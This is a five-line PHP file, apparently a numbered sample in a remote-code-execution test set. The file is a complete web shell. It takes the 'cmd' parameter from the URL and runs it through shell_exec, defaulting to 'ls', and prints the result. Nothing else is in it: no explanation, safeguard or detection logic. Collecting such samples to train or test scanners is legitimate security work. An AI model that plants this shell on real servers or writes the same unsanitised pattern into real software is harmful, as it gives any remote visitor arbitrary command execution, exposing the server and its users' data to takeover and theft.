<?php
// RCE test variation #601
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>